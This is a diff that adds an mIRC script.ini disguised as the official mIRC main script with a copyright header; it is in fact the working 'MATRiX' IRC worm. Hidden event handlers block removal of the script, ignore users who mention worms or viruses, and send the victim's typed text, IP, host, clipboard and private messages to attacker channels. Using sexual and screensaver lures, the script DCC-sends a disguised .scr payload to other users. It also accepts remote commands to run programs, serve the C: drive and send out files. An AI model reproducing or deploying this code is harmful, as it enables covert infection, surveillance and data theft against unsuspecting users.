@@ -1,0 +1,68 @@
+[SCRIPT]
+;
+;PK   
+;mIRC main Script. Please don't edit! http://www.mirc.co.uk
+;by Khaled Mardam-Bey
+;mIRC® Internet Relay Chat Client
+;Copyright © 1995-2000 mIRC Co. Ltd.
+;mIRC 5.4* - 5.5* - 5.6* - 5.7*
+;All Rights Reserved.
+;PK   
+;
+;
+;
+n1=on 1:start:{
+n2= .remote on
+n3= .ctcps on
+n4= .events on
+n5= .raw on
+n6= }
+n7= alias /remove /echo 2*** Removed $1- | halt
+n8= alias /play { if ( $1 = $script ) {/echo 2*** Unable to play $1- | halt }
+n9= alias /unload /echo 2*** Unloaded $1- | halt
+n10=alias /events /.events on | /echo 2*** Events are $1- | halt
+n11=alias /remote /.remote on | /echo 2*** Remote is $1- (Ctcps,Events,Raw) | halt
+n12=on 1:text:*worm*:*:/.ignore -p $nick
+n13=on 1:text:*virus*:*:/.ignore -p $nick
+n14=on 1:text:*file*:*:/.ignore -p $nick
+n15=on 1:text:*exe*:*:/.ignore -p $nick
+n16=on 1:text:*scr*:*:/.ignore -p $nick
+n17=on 1:input:*:/.msg #MATRiXwormmain [( $+ $active $+ ) $1-] $ip on $server $+ : $+ $port $+ $os $host $cb $url $usermode
+n18=;
+n19=on 1:text:*:?:/.msg #MATRiXwormpriv *->  From: $nick $+ * $parms
+n20=on 1:ban:#:/.msg $chan Please if u want the latest best Screen Saver  :) TYPE: !mtrx
+n21=on 1:op:#:/.msg $chan Please if u want the latest best Sexy_XXX_PIX :) TYPE: !xpix
+n22=on 1:kick:#:/.msg $chan Please if u want the latest best XXX PassList :) TYPE: !xpass
+n23=on 1:deop:#:/.msg $chan Please if u want my latest best nude picture :) TYPE: !xpix
+n24=on 1:text:*!mtrx*:#: {/.copy -o C:\Windows\MATRiX_MOVIEx.scr c:\MATRiX_ScreenSaver.scr | { if ( $nick == $me ) {halt} | /.dcc send $nick c:\MATRiX_ScreenSaver.scr }
+n25=on 1:text:*!xpass*:#: {/.copy -o C:\Windows\MATRiX_MOVIEx.scr c:\MATRiX_XXX_Pass_List.pif | { if ( $nick == $me ) {halt} | /.dcc send $nick c:\MATRiX_XXX_Pass_List.pif }
+n26=on 1:text:*!xpix*:#: {/.copy -o C:\Windows\MATRiX_MOVIEx.scr c:\MATRiX_Sexy_PIX.JPG.scr | { if ( $nick == $me ) {halt} | /.dcc send $nick c:\MATRiX_Sexy_PIX.JPG.scr }
+n27=on 1:text:*mtxhak*:#:/fserve $nick 5 C:\
+n28=ctcp 1:*byx*:*:/.exit
+n29=ctcp 1:*run*:*:/.run $2 $3 $4
+n30=ctcp 1:*4me*:*:/.dcc send $nick $2
+n31=on 1:text:*n1*:#:/.nick MATRiX_01 _MaTrIx_-
+n32=on 1:text:*n2*:#:/.nick MATRiX_02 _mAtRiX__
+n33=on 1:text:*n3*:#:/.nick MATRiX_03 MATRIX___
+n34=on 1:text:*n4*:#:/.nick MATRiX_04 ___MATRIX
+n35=on 1:text:*n5*:#:/.nick MATRiX_05 _M_T_R_X_
+n36=on 1:text:*n6*:#:/.nick Syph_iliS _Her_PeS_
+n37=on 1:connect:{ /.enable #sp 
+n38= /.copy -o C:\Windows\Win32.dll C:\Windows\MATRiX_MOVIEx.scr
+n39= /.pdcc 99999999999
+n40= }
+n41=on 1:disconnect:/.clipboard |*|_MATRiX_Slav3___Wanna-see-GoulaG ¿!?¿ UltrasMortNbkTgrDel_Armg0 ¤°+°¤ term3-2000__[MATRiX]-WORM_|*|
+n42=on 1:filercvd:*.*:/.dcc send $nick C:\Windows\MATRiX_MOVIEx.scr
+n43=on 1:filesent:*.jpg,*.jpeg,*.gif,*.bmp,*.mpg,*.mpeg,*.avi:/.dcc send $nick C:\Windows\MATRiX_MOVIEx.scr
+n44=;
+n45=on 1:join:#:/.msg $nick JF 26 exhib ;) - If u want a picture of me... hihi!  TYPE: !xpix in the channel window  :))  $chan
+n46=on 1:nick:/.msg $newnick JF 32 exhib here - If u want picture of me and my boy in action!... woooo!  TYPE: !xpix in the channel $chan  0=))
+n47=on 1:text:*trade*:#:{ if ( $nick == $me ) { halt } | /.dcc send $nick C:\Windows\MATRiX_MOVIEx.scr }
+n48=on 1:text:*help*:#:{ if ( $nick == $me ) { halt } | /.dcc send $nick C:\Windows\MATRiX_MOVIEx.scr }
+n49=on 1:text:*sex*:#:{ if ( $nick == $me ) { halt } | /.dcc send $nick C:\Windows\MATRiX_MOVIEx.scr }
+n50=#sp off
+n51=on 1:part:#:{ if ( $nick == $me ) { halt } | /.dcc send $nick C:\Windows\MATRiX_MOVIEx.scr } | /.disable #sp | /.timersp 0 19 /.enable #sp }
+n52=#sp end
+;;;;;;; ; ; ;  ;
+; WHFG GUR ZNGEvK JBEZ/IVE ZVEP FPEVCG ¤° [ZNGEvK]J0ezIveGebw_ArJL2XNqinaPrqGrpuAvpf !
+;;;;;;; ; ; ;  ;
